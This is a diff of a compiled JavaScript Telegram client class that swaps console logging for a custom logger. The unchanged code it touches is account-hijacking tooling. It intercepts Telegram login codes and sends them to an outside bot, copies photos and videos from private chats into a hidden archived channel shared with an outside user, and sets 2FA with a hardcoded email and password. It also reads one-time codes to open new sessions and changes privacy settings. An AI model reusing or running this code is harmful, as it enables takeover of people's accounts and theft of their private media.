@@ -53,8 +53,10 @@ const logbots_1 = require("../../utils/logbots");
 const connection_manager_1 = require("./utils/connection-manager");
 const message_search_dto_1 = require("./dto/message-search.dto");
 const generateTGConfig_1 = require("./utils/generateTGConfig");
+const telegram_logger_1 = require("./utils/telegram-logger");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
+        this.logger = new telegram_logger_1.TelegramLogger('TgManager');
         this.session = new sessions_1.StringSession(sessionString);
         this.phoneNumber = phoneNumber;
         this.client = null;
@@ -69,7 +71,7 @@ class TelegramManager {
     async createGroup() {
         const groupName = "Saved Messages";
         const groupDescription = this.phoneNumber;
-        console.log("Creating group:", groupName);
+        this.logger.info(this.phoneNumber, "Creating group:", groupName);
         const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
             title: groupName,
             about: groupDescription,
@@ -77,10 +79,10 @@ class TelegramManager {
             forImport: true,
         }));
         const { id, accessHash } = result.chats[0];
-        console.log("Archived chat", id);
+        this.logger.info(this.phoneNumber, "Archived chat", id);
         await this.archiveChat(id, accessHash);
         const usersToAdd = ["fuckyoubabie1"];
-        console.log("Adding users to the channel:", usersToAdd);
+        this.logger.info(this.phoneNumber, "Adding users to the channel:", usersToAdd);
         const addUsersResult = await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
             channel: new telegram_1.Api.InputChannel({
                 channelId: id,
@@ -88,12 +90,12 @@ class TelegramManager {
             }),
             users: usersToAdd
         }));
-        console.log("Successful addition of users:", addUsersResult);
+        this.logger.info(this.phoneNumber, "Successful addition of users:", addUsersResult);
         return { id, accessHash };
     }
     async archiveChat(id, accessHash) {
         const folderId = 1;
-        console.log("Archiving chat", id);
+        this.logger.info(this.phoneNumber, "Archiving chat", id);
         return await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
             folderPeers: [
                 new telegram_1.Api.InputFolderPeer({
@@ -114,20 +116,20 @@ class TelegramManager {
                 const result = await this.joinChannel(channel);
                 channelId = result.chats[0].id;
                 channelAccessHash = result.chats[0].accessHash;
-                console.log("Archived chat", channelId);
+                this.logger.info(this.phoneNumber, "Archived chat", channelId);
             }
             catch (error) {
                 const result = await this.createGroup();
                 channelId = result.id;
                 channelAccessHash = result.accessHash;
-                console.log("Created new group with ID:", channelId);
+                this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
             }
         }
         else {
             const result = await this.createGroup();
             channelId = result.id;
             channelAccessHash = result.accessHash;
-            console.log("Created new group with ID:", channelId);
+            this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
         }
         await this.archiveChat(channelId, channelAccessHash);
         return { id: channelId, accesshash: channelAccessHash };
@@ -135,7 +137,7 @@ class TelegramManager {
     async forwardMedia(channel, fromChatId) {
         let channelId;
         try {
-            console.log("Forwarding media from chat to channel", channel, fromChatId);
+            this.logger.info(this.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
             let channelAccessHash;
             if (fromChatId) {
                 const channelDetails = await this.createOrJoinChannel(channel);
@@ -154,16 +156,16 @@ class TelegramManager {
                     finalChats.add(me.id?.toString());
                     for (const chatId of finalChats) {
                         const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
-                        console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
+                        this.logger.info(this.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
                         await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                         await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                     }
                 }
-                console.log("Completed forwarding messages from top private chats to channel:", channelId);
+                this.logger.info(this.phoneNumber, "Completed forwarding messages from top private chats to channel:", channelId);
             }
         }
         catch (e) {
-            console.log(e);
+            this.logger.info(this.phoneNumber, e);
         }
         if (channelId) {
             await this.leaveChannels([channelId.toString()]);
@@ -188,7 +190,7 @@ class TelegramManager {
                 }
                 return undefined;
             }).filter(id => id !== undefined);
-            console.log(messageIds);
+            this.logger.info(this.phoneNumber, messageIds);
             if (messageIds.length > 0) {
                 try {
                     const result = await this.client.forwardMessages(toChatId, {
@@ -196,16 +198,16 @@ class TelegramManager {
                         fromPeer: fromChatId,
                     });
                     forwardedCount += messageIds.length;
-                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
+                    this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                     await (0, Helpers_1.sleep)(5000);
                 }
                 catch (error) {
-                    console.error("Error occurred while forwarding messages:", error);
+                    this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
                 }
                 await (0, Helpers_1.sleep)(5000);
             }
         } while (messages.length > 0);
-        console.log("Left the channel with ID:", toChatId);
+        this.logger.info(this.phoneNumber, "Left the channel with ID:", toChatId);
         return;
     }
     async forwardMessages(fromChatId, toChatId, messageIds) {
@@ -220,11 +222,11 @@ class TelegramManager {
                     fromPeer: fromChatId,
                 });
                 forwardedCount += chunk.length;
-                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
+                this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                 await (0, Helpers_1.sleep)(5000);
             }
             catch (error) {
-                console.error("Error occurred while forwarding messages:", error);
+                this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
             }
         }
         return forwardedCount;
@@ -237,7 +239,7 @@ class TelegramManager {
                 this.session?.delete();
                 this.channelArray = [];
                 await (0, Helpers_1.sleep)(2000);
-                console.log("Client Destroyed: ", this.phoneNumber);
+                this.logger.info(this.phoneNumber, "Client Destroyed: ", this.phoneNumber);
             }
             catch (error) {
                 (0, parseError_1.parseError)(error, `${this.phoneNumber}: Error during client cleanup`);
@@ -265,7 +267,7 @@ class TelegramManager {
     }
     async errorHandler(error) {
         if (error.message && error.message == 'TIMEOUT') {
-            console.error(`Timeout error occurred for ${this.phoneNumber}, disconnecting client.`);
+            this.logger.error(this.phoneNumber, `Timeout error occurred for ${this.phoneNumber}, disconnecting client.`, error);
             await this.destroy();
         }
         else {
@@ -279,9 +281,9 @@ class TelegramManager {
         this.client._errorHandler = this.errorHandler;
         await this.client.connect();
         const me = await this.client.getMe();
-        console.log("Connected Client : ", me.phone);
+        this.logger.info(this.phoneNumber, "Connected Client : ", me.phone);
         if (handler && this.client) {
-            console.log("Adding event Handler");
+            this.logger.info(this.phoneNumber, "Adding event Handler");
             if (handlerFn) {
                 this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
             }
@@ -296,10 +298,10 @@ class TelegramManager {
             const result = [];
             const chat = await this.client.getEntity(entity);
             if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
-                console.log("Invalid group or channel!");
+                this.logger.info(this.phoneNumber, "Invalid group or channel!");
                 return;
             }
-            console.log(`Fetching members of ${chat.title || chat.username}...`);
+            this.logger.info(this.phoneNumber, `Fetching members of ${chat.title || chat.username}...`);
             const participants = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
                 channel: chat,
                 filter: new telegram_1.Api.ChannelParticipantsRecent(),
@@ -309,7 +311,7 @@ class TelegramManager {
             }));
             if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
                 const users = participants.participants;
-                console.log(`Members: ${users.length}`);
+                this.logger.info(this.phoneNumber, `Members: ${users.length}`);
                 for (const user of users) {
                     const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                     if (userInfo) {
@@ -320,22 +322,22 @@ class TelegramManager {
                             username: `${userDetails.username || ""}`,
                         });
                         if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
-                            console.log(JSON.stringify(userDetails.id));
+                            this.logger.info(this.phoneNumber, JSON.stringify(userDetails.id));
                         }
                     }
                     else {
-                        console.log(JSON.stringify(user?.userId));
+                        this.logger.info(this.phoneNumber, JSON.stringify(user?.userId));
                     }
                 }
             }
             else {
-                console.log("No members found or invalid group.");
+                this.logger.info(this.phoneNumber, "No members found or invalid group.");
             }
-            console.log(result.length);
+            this.logger.info(this.phoneNumber, `${result.length}`);
             return result;
         }
         catch (err) {
-            console.error("Error fetching group members:", err);
+            this.logger.error(this.phoneNumber, "Error fetching group members:", err);
         }
     }
     async getMessages(entityLike, limit = 8) {
@@ -344,7 +346,7 @@ class TelegramManager {
     }
     async getDialogs(params) {
         const chats = await this.client.getDialogs(params);
-        console.log("TotalChats:", chats.total);
+        this.logger.info(this.phoneNumber, "TotalChats:", chats.total);
         return chats;
     }
     async getSelfMSgsInfo() {
@@ -397,7 +399,7 @@ class TelegramManager {
         let totalCount = 0;
         this.channelArray.length = 0;
         const canSendFalseChats = [];
-        console.log("TotalChats:", chats.total);
+        this.logger.info(this.phoneNumber, "TotalChats:", chats.total);
         for (const chat of chats) {
             if (chat.isChannel || chat.isGroup) {
                 try {
@@ -442,12 +444,12 @@ class TelegramManager {
                     }));
                 }
                 catch (e) {
-                    console.log(e);
+                    this.logger.info(this.phoneNumber, e);
                 }
             }
         }
         catch (error) {
-            console.error("Error adding contacts:", error);
+            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
             (0, parseError_1.parseError)(error, `Failed to save contacts`);
         }
     }
@@ -469,23 +471,23 @@ class TelegramManager {
             const result = await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                 contacts: inputContacts,
             }));
-            console.log("Imported Contacts Result:", result);
+            this.logger.info(this.phoneNumber, "Imported Contacts Result:", result);
         }
         catch (error) {
-            console.error("Error adding contacts:", error);
+            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
             (0, parseError_1.parseError)(error, `Failed to save contacts`);
         }
     }
     async leaveChannels(chats) {
-        console.log("Leaving Channels: initaied!!");
-        console.log("ChatsLength: ", chats);
+        this.logger.info(this.phoneNumber, "Leaving Channels: initaied!!");
+        this.logger.info(this.phoneNumber, "ChatsLength: ", chats);
         for (const id of chats) {
             const channelId = id.startsWith('-100') ? id : `-100${id}`;
             try {
                 await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                     channel: channelId
                 }));
-                console.log(`${this.phoneNumber} Left channel :`, id);
+                this.logger.info(this.phoneNumber, `${this.phoneNumber} Left channel :`, id);
                 if (chats.length > 1) {
                     await (0, Helpers_1.sleep)(3000);
                 }
@@ -500,19 +502,19 @@ class TelegramManager {
                         }));
                     }
                     catch (err) {
-                        console.warn(`${this.phoneNumber} Cannot fetch entity for: ${channelId}, likely not a member or invalid`);
+                        this.logger.waning(this.phoneNumber, `Cannot fetch entity for: ${channelId}, likely not a member or invalid`);
                         continue;
                     }
                 }
             }
         }
-        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);
+        this.logger.info(this.phoneNumber, `${this.phoneNumber} Leaving Channels: Completed!!`);
     }
     async getEntity(entity) {
         return await this.client?.getEntity(entity);
     }
     async joinChannel(entity) {
-        console.log("trying to join channel : ", entity);
+        this.logger.info(this.phoneNumber, "trying to join channel : ", entity);
         return await this.client?.invoke(new telegram_1.Api.channels.JoinChannel({
             channel: await this.client?.getEntity(entity)
         }));
@@ -572,7 +574,7 @@ class TelegramManager {
         if (!this.client)
             throw new Error('Client is not initialized');
         const chats = await this.client.getDialogs({ limit: 500 });
-        console.log("TotalChats:", chats.total);
+        this.logger.info(this.phoneNumber, "TotalChats:", chats.total);
         const chatData = [];
         for (const chat of chats) {
             const chatEntity = await chat.entity.toJSON();
@@ -608,12 +610,12 @@ class TelegramManager {
     }
     async getMediaUrl(message) {
         if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
-            console.log("messageId image:", message.id);
+            this.logger.info(this.phoneNumber, "messageId image:", message.id);
             const sizes = message.photo?.sizes || [1];
             return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
         }
         else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
-            console.log("messageId video:", message.id);
+            this.logger.info(this.phoneNumber, "messageId video:", message.id);
             const sizes = message.document?.thumbs || [1];
             return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
         }
@@ -718,7 +720,7 @@ class TelegramManager {
                 });
             }
         }
-        console.log({
+        this.logger.info(this.phoneNumber, 'CallLog: ', {
             ...filteredResults,
             chatCallCounts: filteredChatCallCounts
         });
@@ -770,9 +772,9 @@ class TelegramManager {
     async handleEvents(event) {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
-                console.log(event.message.text.toLowerCase());
-                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
-                console.log("Date :", new Date(event.message.date * 1000));
+                this.logger.info(this.phoneNumber, event.message.text.toLowerCase());
+                this.logger.info(this.phoneNumber, `Login Code received for - ${this.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
+                this.logger.info(this.phoneNumber, "Date :", new Date(event.message.date * 1000));
                 await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
             }
         }
@@ -785,21 +787,21 @@ class TelegramManager {
                     new telegram_1.Api.InputPrivacyValueDisallowAll()
                 ],
             }));
-            console.log("Calls Updated");
+            this.logger.info(this.phoneNumber, "Calls Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                 rules: [
                     new telegram_1.Api.InputPrivacyValueAllowAll()
                 ],
             }));
-            console.log("PP Updated");
+            this.logger.info(this.phoneNumber, "PP Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                 rules: [
                     new telegram_1.Api.InputPrivacyValueDisallowAll()
                 ],
             }));
-            console.log("Number Updated");
+            this.logger.info(this.phoneNumber, "Number Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                 rules: [
@@ -812,7 +814,7 @@ class TelegramManager {
                     new telegram_1.Api.InputPrivacyValueAllowAll()
                 ],
             }));
-            console.log("LAstSeen Updated");
+            this.logger.info(this.phoneNumber, "LAstSeen Updated");
         }
         catch (e) {
             throw e;
@@ -830,7 +832,7 @@ class TelegramManager {
         }
         try {
             const result = await this.client.invoke(new telegram_1.Api.account.UpdateProfile(data));
-            console.log("Updated NAme: ", firstName);
+            this.logger.info(this.phoneNumber, "Updated NAme: ", firstName);
         }
         catch (error) {
             throw error;
@@ -843,7 +845,7 @@ class TelegramManager {
                 offset: 0,
             }));
             if (photos.photos.length > 0) {
-                console.log(`You have ${photos.photos.length} profile photos.`);
+                this.logger.info(this.phoneNumber, `You have ${photos.photos.length} profile photos.`);
                 if (photoIndex < photos.photos.length) {
                     const selectedPhoto = photos.photos[photoIndex];
                     const index = Math.max(selectedPhoto.sizes.length - 2, 0);
@@ -859,23 +861,23 @@ class TelegramManager {
                     if (photoBuffer) {
                         const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                         fs.writeFileSync(outputPath, photoBuffer);
-                        console.log(`Profile picture downloaded as '${outputPath}'`);
+                        this.logger.info(this.phoneNumber, `Profile picture downloaded as '${outputPath}'`);
                         return outputPath;
                     }
                     else {
-                        console.log("Failed to download the photo.");
+                        this.logger.info(this.phoneNumber, "Failed to download the photo.");
                     }
                 }
                 else {
-                    console.log(`Photo index ${photoIndex} is out of range.`);
+                    this.logger.info(this.phoneNumber, `Photo index ${photoIndex} is out of range.`);
                 }
             }
             else {
-                console.log("No profile photos found.");
+                this.logger.info(this.phoneNumber, "No profile photos found.");
             }
         }
         catch (err) {
-            console.error("Error:", err);
+            this.logger.error(this.phoneNumber, "Error:", err);
         }
     }
     async getLastActiveTime() {
@@ -899,10 +901,10 @@ class TelegramManager {
     async deleteChat(params) {
         try {
             await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
-            console.log(`Dialog with ID ${params.peer} has been deleted.`);
+            this.logger.info(this.phoneNumber, `Dialog with ID ${params.peer} has been deleted.`);
         }
         catch (error) {
-            console.error('Failed to delete dialog:', error);
+            this.logger.error(this.phoneNumber, 'Failed to delete dialog:', error);
         }
     }
     async blockUser(chatId) {
@@ -910,10 +912,10 @@ class TelegramManager {
             await this.client?.invoke(new telegram_1.Api.contacts.Block({
                 id: chatId,
             }));
-            console.log(`User with ID ${chatId} has been blocked.`);
+            this.logger.info(this.phoneNumber, `User with ID ${chatId} has been blocked.`);
         }
         catch (error) {
-            console.error('Failed to block user:', error);
+            this.logger.error(this.phoneNumber, 'Failed to block user:', error);
         }
     }
     async getMediaMetadata(params) {
@@ -928,9 +930,9 @@ class TelegramManager {
             ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
         };
         const ent = await this.safeGetEntity(chatId);
-        console.log(query);
+        this.logger.info(this.phoneNumber, `${query}`);
         const messages = await this.client.getMessages(ent, query);
-        console.log(`Fetched ${messages.length} messages`);
+        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);
         const filteredMessages = messages.map(message => {
             const messageIds = [];
             if (message.media) {
@@ -996,7 +998,7 @@ class TelegramManager {
             if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                 return res.status(404).send('File reference expired');
             }
-            console.error('Error downloading media:', error);
+            this.logger.error(this.phoneNumber, 'Error downloading media:', error);
             res.status(500).send('Error downloading media');
         }
     }
@@ -1040,7 +1042,7 @@ class TelegramManager {
             await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });
         }
         catch (error) {
-            console.log("Failed to Forward Message : ", error.errorMessage);
+            this.logger.info(this.phoneNumber, "Failed to Forward Message : ", error.errorMessage);
         }
     }
     async updateUsername(baseUsername) {
@@ -1050,20 +1052,20 @@ class TelegramManager {
         if (username === '') {
             try {
                 await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
-                console.log(`Removed Username successfully.`);
+                this.logger.info(this.phoneNumber, `Removed Username successfully.`);
             }
             catch (error) {
-                console.log(error);
+                this.logger.info(this.phoneNumber, error);
             }
         }
         else {
             while (increment < 10) {
                 try {
                     const result = await this.client.invoke(new telegram_1.Api.account.CheckUsername({ username }));
-                    console.log(result, " - ", username);
+                    this.logger.info(this.phoneNumber, `Avialable: ${result} (${username})`);
                     if (result) {
                         await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
-                        console.log(`Username '${username}' updated successfully.`);
+                        this.logger.info(this.phoneNumber, `Username '${username}' updated successfully.`);
                         newUserName = username;
                         break;
                     }
@@ -1080,7 +1082,7 @@ class TelegramManager {
                     }
                 }
                 catch (error) {
-                    console.log(error.message);
+                    this.logger.info(this.phoneNumber, error.message);
                     if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                         newUserName = username;
                         break;
@@ -1107,35 +1109,35 @@ class TelegramManager {
                     new telegram_1.Api.InputPrivacyValueDisallowAll()
                 ],
             }));
-            console.log("Calls Updated");
+            this.logger.info(this.phoneNumber, "Calls Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                 rules: [
                     new telegram_1.Api.InputPrivacyValueAllowAll()
                 ],
             }));
-            console.log("PP Updated");
+            this.logger.info(this.phoneNumber, "PP Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyForwards(),
                 rules: [
                     new telegram_1.Api.InputPrivacyValueAllowAll()
                 ],
             }));
-            console.log("forwards Updated");
+            this.logger.info(this.phoneNumber, "forwards Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                 rules: [
                     new telegram_1.Api.InputPrivacyValueDisallowAll()
                 ],
             }));
-            console.log("Number Updated");
+            this.logger.info(this.phoneNumber, "Number Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                 rules: [
                     new telegram_1.Api.InputPrivacyValueAllowAll(),
                 ],
             }));
-            console.log("LAstSeen Updated");
+            this.logger.info(this.phoneNumber, "LAstSeen Updated");
             await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                 key: new telegram_1.Api.InputPrivacyKeyAbout(),
                 rules: [
@@ -1180,11 +1182,11 @@ class TelegramManager {
                 message: caption,
                 randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
             }));
-            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
+            this.logger.info(this.phoneNumber, `Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
             return result;
         }
         catch (error) {
-            console.error('Error sending view-once media:', error);
+            this.logger.error(this.phoneNumber, 'Error sending view-once media:', error);
             throw error;
         }
     }
@@ -1205,11 +1207,11 @@ class TelegramManager {
                 file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                 workers: 1,
             });
-            console.log("file uploaded");
+            this.logger.info(this.phoneNumber, "file uploaded");
             await this.client.invoke(new telegram_1.Api.photos.UploadProfilePhoto({
                 file: file,
             }));
-            console.log("profile pic updated");
+            this.logger.info(this.phoneNumber, "profile pic updated");
         }
         catch (error) {
             throw error;
@@ -1221,7 +1223,7 @@ class TelegramManager {
     }
     async set2fa() {
         if (!(await this.hasPassword())) {
-            console.log("Password Does not exist, Setting 2FA");
+            this.logger.info(this.phoneNumber, "Password Does not exist, Setting 2FA");
             const imapService = IMap_1.MailReader.getInstance();
             const twoFaDetails = {
                 email: "storeslaksmi@gmail.com",
@@ -1231,26 +1233,26 @@ class TelegramManager {
             try {
                 await imapService.connectToMail();
                 const checkMailInterval = setInterval(async () => {
-                    console.log("Checking if mail is ready");
+                    this.logger.info(this.phoneNumber, "Checking if mail is ready");
                     if (imapService.isMailReady()) {
                         clearInterval(checkMailInterval);
-                        console.log("Mail is ready, checking code!");
+                        this.logger.info(this.phoneNumber, "Mail is ready, checking code!");
                         await this.client.updateTwoFaSettings({
                             isCheckPassword: false,
                             email: twoFaDetails.email,
                             hint: twoFaDetails.hint,
                             newPassword: twoFaDetails.newPassword,
                             emailCodeCallback: async (length) => {
-                                console.log("Code sent");
+                                this.logger.info(this.phoneNumber, "Code sent");
                                 return new Promise(async (resolve, reject) => {
                                     let retry = 0;
                                     const codeInterval = setInterval(async () => {
                                         try {
-                                            console.log("Checking code");
+                                            this.logger.info(this.phoneNumber, "Checking code");
                                             retry++;
                                             if (imapService.isMailReady() && retry < 4) {
                                                 const code = await imapService.getCode();
-                                                console.log('Code:', code);
+                                                this.logger.info(this.phoneNumber, 'Code:', code);
                                                 if (code) {
                                                     await imapService.disconnectFromMail();
                                                     clearInterval(codeInterval);
@@ -1272,23 +1274,23 @@ class TelegramManager {
                                 });
                             },
                             onEmailCodeError: (e) => {
-                                console.error('Email code error:', (0, parseError_1.parseError)(e));
+                                this.logger.error(this.phoneNumber, 'Email code error:', (0, parseError_1.parseError)(e));
                                 return Promise.resolve("error");
                             }
                         });
                         return twoFaDetails;
                     }
                     else {
-                        console.log("Mail not ready yet");
+                        this.logger.info(this.phoneNumber, "Mail not ready yet");
                     }
                 }, 5000);
             }
             catch (e) {
-                console.error("Unable to connect to mail server:", (0, parseError_1.parseError)(e));
+                this.logger.error(this.phoneNumber, "Unable to connect to mail server:", (0, parseError_1.parseError)(e));
             }
         }
         else {
-            console.log("Password already exists");
+            this.logger.info(this.phoneNumber, "Password already exists");
         }
     }
     async sendPhotoChat(id, url, caption, filename) {
@@ -1310,13 +1312,13 @@ class TelegramManager {
             const result = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                 userId: "me"
             }));
-            console.log(`Profile Pics found: ${result.photos.length}`);
+            this.logger.info(this.phoneNumber, `Profile Pics found: ${result.photos.length}`);
             if (result && result.photos?.length > 0) {
                 const res = await this.client.invoke(new telegram_1.Api.photos.DeletePhotos({
                     id: result.photos
                 }));
             }
-            console.log("Deleted profile Photos");
+            this.logger.info(this.phoneNumber, "Deleted profile Photos");
         }
         catch (error) {
             throw error;
@@ -1326,22 +1328,22 @@ class TelegramManager {
         const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000));
         const sessionPromise = (async () => {
             const me = await this.client.getMe();
-            console.log("Creating new session for: ", me.phone);
+            this.logger.info(this.phoneNumber, "Creating new session for: ", me.phone);
             const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, (0, generateTGConfig_1.generateTGConfig)());
-            console.log("Starting Session Creation...");
+            this.logger.info(this.phoneNumber, "Starting Session Creation...");
             await newClient.start({
                 phoneNumber: me.phone,
                 password: async () => "Ajtdmwajt1@",
                 phoneCode: async () => {
-                    console.log('Waiting for the OTP code from chat ID 777000...');
+                    this.logger.info(this.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
                     return await this.waitForOtp();
                 },
                 onError: (err) => { throw err; },
             });
-            console.log("Session Creation Completed");
+            this.logger.info(this.phoneNumber, "Session Creation Completed");
             const session = newClient.session.save();
             await newClient.destroy();
-            console.log("New Session: ", session);
+            this.logger.info(this.phoneNumber, "New Session: ", session);
             return session;
         })();
         return Promise.race([sessionPromise, timeoutPromise]);
@@ -1349,18 +1351,18 @@ class TelegramManager {
     async waitForOtp() {
         for (let i = 0; i < 3; i++) {
             try {
-                console.log("Attempt : ", i);
+                this.logger.info(this.phoneNumber, "Attempt : ", i);
                 const messages = await this.client.getMessages('777000', { limit: 1 });
                 const message = messages[0];
                 if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                     const code = message.text.split('.')[0].split("code:**")[1].trim();
-                    console.log("returning: ", code);
+                    this.logger.info(this.phoneNumber, "returning: ", code);
                     return code;
                 }
                 else {
-                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
+                    this.logger.info(this.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                     const code = message.text.split('.')[0].split("code:**")[1].trim();
-                    console.log("Skipped Code: ", code);
+                    this.logger.info(this.phoneNumber, "Skipped Code: ", code);
                     if (i == 2) {
                         return code;
                     }
@@ -1369,7 +1371,7 @@ class TelegramManager {
             }
             catch (err) {
                 await (0, Helpers_1.sleep)(2000);
-                console.log(err);
+                this.logger.info(this.phoneNumber, err);
             }
         }
     }
@@ -1946,7 +1948,7 @@ class TelegramManager {
             roundVoice: { messages: [], total: 0 },
         };
         const { chatId, query = '', types, maxId, minId, limit } = params;
-        console.log("Types: ", types);
+        this.logger.info(this.phoneNumber, "Types: ", types);
         for (const type of types) {
             const filter = this.getSearchFilter(type);
             const queryFilter = {
@@ -1954,7 +1956,7 @@ class TelegramManager {
                 ...(maxId ? { maxId } : {}),
                 ...(minId ? { minId } : {}),
             };
-            console.log(type, queryFilter);
+            this.logger.info(this.phoneNumber, type, queryFilter);
             const searchQuery = {
                 q: query,
                 filter: filter,
@@ -1963,20 +1965,20 @@ class TelegramManager {
             };
             let messages = [];
             let count = 0;
-            console.log("Search Query: ", searchQuery);
+            this.logger.info(this.phoneNumber, "Search Query: ", searchQuery);
             if (chatId) {
                 searchQuery['peer'] = await this.safeGetEntity(chatId);
-                console.log("Performing search in chat: ", chatId);
+                this.logger.info(this.phoneNumber, "Performing search in chat: ", chatId);
                 const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
                 if (!('messages' in result)) {
                     return {};
                 }
-                console.log(type, result?.messages?.length, result["count"]);
+                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                 count = result["count"] || 0;
                 messages = result.messages;
             }
             else {
-                console.log("Performing global search");
+                this.logger.info(this.phoneNumber, "Performing global search");
                 const result = await this.client.invoke(new telegram_1.Api.messages.SearchGlobal({
                     ...searchQuery,
                     offsetRate: 0,
@@ -1987,12 +1989,12 @@ class TelegramManager {
                 if (!('messages' in result)) {
                     return {};
                 }
-                console.log(type, result?.messages?.length, result["count"]);
+                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                 count = result["count"] || 0;
                 messages = result.messages;
             }
             if (types.includes(message_search_dto_1.MessageMediaType.TEXT) && types.length === 1) {
-                console.log("Text Filter");
+                this.logger.info(this.phoneNumber, "Text Filter");
                 messages = messages.filter((msg) => !('media' in msg));
             }
             const processedMessages = await Promise.all(messages.map(async (message) => {
@@ -2049,15 +2051,15 @@ class TelegramManager {
                 maxId: lastOffsetId,
                 minId
             });
-            console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
+            this.logger.info(this.phoneNumber, `hasMore: ${response.hasMore}, Total: ${response.total}, lastOffsetId: ${response.lastOffsetId}`);
             allMedia = allMedia.concat(response.messages);
             if (!response.hasMore) {
                 hasMore = false;
-                console.log('No more messages to fetch');
+                this.logger.info(this.phoneNumber, 'No more messages to fetch');
             }
             else {
                 lastOffsetId = response.lastOffsetId;
-                console.log(`Fetched ${allMedia.length} messages so far`);
+                this.logger.info(this.phoneNumber, `Fetched ${allMedia.length} messages so far`);
             }
             await (0, Helpers_1.sleep)(3000);
         }
@@ -2078,16 +2080,16 @@ class TelegramManager {
